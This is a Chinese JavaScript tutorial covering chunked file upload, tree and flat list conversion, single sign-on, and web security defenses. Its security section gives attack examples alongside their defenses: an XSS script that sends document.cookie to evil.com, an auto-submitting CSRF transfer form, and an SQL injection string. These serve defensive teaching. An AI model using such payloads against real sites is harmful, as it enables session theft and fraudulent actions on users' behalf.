## 第一性原理拆解：JavaScript 应用

### 核心问题：实际开发中常见的复杂场景如何解决？

---

## 一、大文件上传

### 核心思路：切片 + 并发 + 断点续传

```
┌─────────────────────────────────────────────────────────┐
│  大文件直接上传的问题：                                  │
│  • 超时风险                                             │
│  • 失败需要重传整个文件                                  │
│  • 无法显示进度                                         │
├─────────────────────────────────────────────────────────┤
│  解决方案：分片上传                                      │
│  1. 读取文件 → 2. 切片 → 3. 并发上传 → 4. 服务端合并    │
└─────────────────────────────────────────────────────────┘
```

### 实现步骤

**1. 读取文件**

```html
<input type="file" id="input" />
```

```javascript
const input = document.getElementById('input');
input.addEventListener('change', (e) => {
    const file = e.target.files[0];
    // file 是 File 对象
});
```

**2. 文件切片**

```javascript
// File 对象属性
// file.name - 文件名
// file.size - 文件大小（字节）
// file.type - MIME 类型

function createChunks(file, chunkSize = 1024 * 1024) {  // 1MB 每片
    const chunks = [];
    let cur = 0;
    
    while (cur < file.size) {
        chunks.push(file.slice(cur, cur + chunkSize));
        cur += chunkSize;
    }
    
    return chunks;
}
```

**3. 上传切片**

```javascript
async function uploadChunks(file, chunks) {
    const formDataList = chunks.map((chunk, index) => {
        const formData = new FormData();
        formData.append('file', chunk);
        formData.append('filename', file.name);
        formData.append('chunkIndex', index);
        formData.append('totalChunks', chunks.length);
        return formData;
    });
    
    // 并发上传
    await Promise.all(
        formDataList.map(formData => 
            fetch('/upload', {
                method: 'POST',
                body: formData
            })
        )
    );
    
    // 通知服务端合并
    await fetch('/merge', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            filename: file.name,
            totalChunks: chunks.length
        })
    });
}
```

**4. 完整代码（含进度、并发控制）**

```javascript
class FileUploader {
    constructor(options = {}) {
        this.chunkSize = options.chunkSize || 1024 * 1024;  // 1MB
        this.concurrency = options.concurrency || 3;        // 并发数
    }
    
    // 计算文件 hash（用于断点续传）
    async calculateHash(file) {
        return new Promise(resolve => {
            const spark = new SparkMD5.ArrayBuffer();
            const reader = new FileReader();
            reader.readAsArrayBuffer(file);
            reader.onload = (e) => {
                spark.append(e.target.result);
                resolve(spark.end());
            };
        });
    }
    
    // 创建切片
    createChunks(file) {
        const chunks = [];
        let cur = 0;
        let index = 0;
        
        while (cur < file.size) {
            chunks.push({
                index: index++,
                blob: file.slice(cur, cur + this.chunkSize)
            });
            cur += this.chunkSize;
        }
        
        return chunks;
    }
    
    // 并发控制上传
    async uploadWithLimit(chunks, hash, onProgress) {
        const pool = [];  // 并发池
        let completed = 0;
        
        for (const chunk of chunks) {
            const task = this.uploadChunk(chunk, hash).then(() => {
                completed++;
                onProgress?.(completed / chunks.length * 100);
                pool.splice(pool.indexOf(task), 1);
            });
            
            pool.push(task);
            
            if (pool.length >= this.concurrency) {
                await Promise.race(pool);
            }
        }
        
        await Promise.all(pool);
    }
    
    // 上传单个切片
    async uploadChunk(chunk, hash) {
        const formData = new FormData();
        formData.append('chunk', chunk.blob);
        formData.append('hash', hash);
        formData.append('index', chunk.index);
        
        return fetch('/upload/chunk', {
            method: 'POST',
            body: formData
        });
    }
    
    // 主入口
    async upload(file, onProgress) {
        const hash = await this.calculateHash(file);
        const chunks = this.createChunks(file);
        
        await this.uploadWithLimit(chunks, hash, onProgress);
        
        // 合并请求
        await fetch('/upload/merge', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                hash,
                filename: file.name,
                totalChunks: chunks.length
            })
        });
    }
}

// 使用
const uploader = new FileUploader({ chunkSize: 2 * 1024 * 1024 });
uploader.upload(file, progress => console.log(`${progress}%`));
```

---

## 二、树形结构与扁平列表互转

### 数据结构

```javascript
// 扁平列表
const flat = [
    { id: 1, name: '部门1', pid: 0 },
    { id: 2, name: '部门2', pid: 1 },
    { id: 3, name: '部门3', pid: 1 },
    { id: 4, name: '部门4', pid: 3 },
    { id: 5, name: '部门5', pid: 4 }
];

// 树形结构
const tree = [
    {
        id: 1,
        name: '部门1',
        pid: 0,
        children: [
            { id: 2, name: '部门2', pid: 1, children: [] },
            {
                id: 3,
                name: '部门3',
                pid: 1,
                children: [
                    {
                        id: 4,
                        name: '部门4',
                        pid: 3,
                        children: [
                            { id: 5, name: '部门5', pid: 4, children: [] }
                        ]
                    }
                ]
            }
        ]
    }
];
```

### 扁平 → 树形（经典面试题）

```javascript
// 方法一：两次遍历
function flatToTree(flat) {
    const map = {};
    const result = [];
    
    // 第一次遍历：建立 id -> item 映射
    flat.forEach(item => {
        map[item.id] = { ...item, children: [] };
    });
    
    // 第二次遍历：建立父子关系
    flat.forEach(item => {
        const node = map[item.id];
        if (item.pid === 0) {
            result.push(node);
        } else {
            map[item.pid]?.children.push(node);
        }
    });
    
    return result;
}

// 方法二：一次遍历（更优）
function flatToTree(flat) {
    const map = {};
    const result = [];
    
    flat.forEach(item => {
        const { id, pid } = item;
        
        // 如果当前节点不存在，创建它
        if (!map[id]) {
            map[id] = { children: [] };
        }
        
        // 合并数据
        map[id] = { ...item, children: map[id].children };
        
        const node = map[id];
        
        if (pid === 0) {
            result.push(node);
        } else {
            // 如果父节点不存在，先创建
            if (!map[pid]) {
                map[pid] = { children: [] };
            }
            map[pid].children.push(node);
        }
    });
    
    return result;
}
```

### 树形 → 扁平

```javascript
// 方法一：递归
function treeToFlat(tree, result = []) {
    tree.forEach(node => {
        const { children, ...rest } = node;
        result.push(rest);
        if (children?.length) {
            treeToFlat(children, result);
        }
    });
    return result;
}

// 方法二：BFS（广度优先）
function treeToFlat(tree) {
    const result = [];
    const queue = [...tree];
    
    while (queue.length) {
        const node = queue.shift();
        const { children, ...rest } = node;
        result.push(rest);
        
        if (children?.length) {
            queue.push(...children);
        }
    }
    
    return result;
}

// 方法三：DFS（深度优先，栈实现）
function treeToFlat(tree) {
    const result = [];
    const stack = [...tree];
    
    while (stack.length) {
        const node = stack.pop();
        const { children, ...rest } = node;
        result.push(rest);
        
        if (children?.length) {
            stack.push(...children.reverse());  // 保持顺序
        }
    }
    
    return result;
}
```

---

## 三、单点登录（SSO）

### 核心问题：多个系统如何共享登录状态？

```
┌─────────────────────────────────────────────────────────┐
│  单点登录（Single Sign On）                              │
│  一次登录，多系统共享                                    │
└─────────────────────────────────────────────────────────┘
```

### 同域单点登录

```
场景：同一主域名下的多个子系统
例如：www.baidu.com 和 tieba.baidu.com

方案：将 Cookie 的 domain 设为顶级域名
```

```javascript
// 设置 cookie 到顶级域名
document.cookie = 'token=xxx; domain=.baidu.com; path=/';

// 所有 *.baidu.com 都能访问这个 cookie
```

### 跨域单点登录（完整方案）

```
┌─────────────────────────────────────────────────────────┐
│                                                         │
│   App A          SSO 认证中心          App B            │
│   domain1.com    sso.com              domain2.com       │
│       │              │                    │             │
│       │  1.未登录    │                    │             │
│       │───────────→│                    │             │
│       │              │                    │             │
│       │  2.跳转登录页│                    │             │
│       │←───────────│                    │             │
│       │              │                    │             │
│       │  3.登录成功  │                    │             │
│       │───────────→│                    │             │
│       │              │                    │             │
│       │  4.返回Token │                    │             │
│       │←───────────│                    │             │
│       │              │  5.访问B          │             │
│       │              │←───────────────│             │
│       │              │  6.验证Token      │             │
│       │              │───────────────→│             │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 实现流程

```javascript
// 1. 应用检查登录状态
async function checkLogin() {
    const token = localStorage.getItem('sso_token');
    
    if (!token) {
        // 跳转到 SSO 登录页
        window.location.href = `https://sso.com/login?redirect=${encodeURIComponent(window.location.href)}`;
        return;
    }
    
    // 验证 token
    const res = await fetch('https://sso.com/verify', {
        headers: { Authorization: `Bearer ${token}` }
    });
    
    if (!res.ok) {
        localStorage.removeItem('sso_token');
        checkLogin();
    }
}

// 2. SSO 登录成功后回调
function handleCallback() {
    const params = new URLSearchParams(window.location.search);
    const token = params.get('token');
    const redirect = params.get('redirect');
    
    if (token) {
        localStorage.setItem('sso_token', token);
        window.location.href = redirect || '/';
    }
}
```

---

## 四、Web 安全攻击

### 1. XSS（跨站脚本攻击）

```
┌─────────────────────────────────────────────────────────┐
│  原理：攻击者在网页中注入恶意脚本                        │
│  危害：窃取 cookie、session、敏感信息                    │
└─────────────────────────────────────────────────────────┘
```

**攻击示例**

```javascript
// 存储型 XSS：恶意脚本存入数据库
// 攻击者在评论框输入：
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// 反射型 XSS：恶意脚本在 URL 中
// https://example.com/search?q=<script>alert('xss')</script>
```

**防御措施**

```javascript
// 1. 输入过滤 & 输出编码
function escapeHtml(str) {
    const escapeMap = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;'
    };
    return str.replace(/[&<>"'/]/g, char => escapeMap[char]);
}

// 2. 设置 CSP（内容安全策略）
// Content-Security-Policy: default-src 'self'

// 3. 设置 HttpOnly Cookie（JS 无法读取）
// Set-Cookie: sessionId=xxx; HttpOnly

// 4. Vue/React 自动转义
// Vue: 不要使用 v-html
// React: 不要使用 dangerouslySetInnerHTML
```

### 2. CSRF（跨站请求伪造）

```
┌─────────────────────────────────────────────────────────┐
│  原理：诱导用户访问恶意网站，利用已有的登录态发起请求    │
│  危害：以用户身份执行操作（转账、修改密码等）            │
└─────────────────────────────────────────────────────────┘
```

**攻击示例**

```html
<!-- evil.com 页面 -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

**防御措施**

```javascript
// 1. CSRF Token
// 服务端生成随机 token，存入 session
// 表单提交时携带 token，服务端验证

// 2. SameSite Cookie
// Set-Cookie: sessionId=xxx; SameSite=Strict

// 3. 验证 Referer/Origin
app.use((req, res, next) => {
    const referer = req.headers.referer;
    if (!referer || !referer.startsWith('https://mysite.com')) {
        return res.status(403).send('Forbidden');
    }
    next();
});

// 4. 双重 Cookie 验证
// 请求时在 header 和 body 中都携带 token
```

### 3. SQL 注入

```
┌─────────────────────────────────────────────────────────┐
│  原理：将恶意 SQL 拼接到查询语句中                       │
│  危害：数据泄露、数据篡改、数据库被删除                  │
└─────────────────────────────────────────────────────────┘
```

**攻击示例**

```javascript
// 危险代码
const query = `SELECT * FROM users WHERE name = '${userInput}'`;

// 攻击者输入: ' OR '1'='1
// 变成: SELECT * FROM users WHERE name = '' OR '1'='1'
// 返回所有用户！
```

**防御措施**

```javascript
// 1. 使用参数化查询（预编译）
const query = 'SELECT * FROM users WHERE name = ?';
db.query(query, [userInput]);

// 2. 使用 ORM
User.findOne({ where: { name: userInput } });

// 3. 输入验证
function validateInput(input) {
    return /^[a-zA-Z0-9_]+$/.test(input);
}
```

---

## 总结

```
┌─────────────────────────────────────────────────────────────────┐
│                    JavaScript 实战应用                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  大文件上传                                                     │
│  ├── 文件切片：file.slice()                                     │
│  ├── 并发上传：Promise.all + 并发控制                           │
│  ├── 断点续传：hash 标识 + 已上传切片记录                        │
│  └── 进度显示：已完成 / 总数                                    │
│                                                                 │
│  树形 ↔ 扁平转换                                                │
│  ├── 扁平→树：Map 存储 + 建立父子关系                           │
│  └── 树→扁平：递归 / BFS / DFS                                  │
│                                                                 │
│  单点登录（SSO）                                                │
│  ├── 同域：Cookie domain 设为顶级域名                           │
│  └── 跨域：统一认证中心 + Token 传递                            │
│                                                                 │
│  Web 安全                                                       │
│  ├── XSS：输入过滤 + 输出编码 + CSP + HttpOnly                  │
│  ├── CSRF：Token + SameSite + Referer 校验                      │
│  └── SQL注入：参数化查询 + ORM                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**核心记忆：大文件切片上传，树形Map一次遍历，SSO统一认证，安全三件套（XSS/CSRF/SQL）。**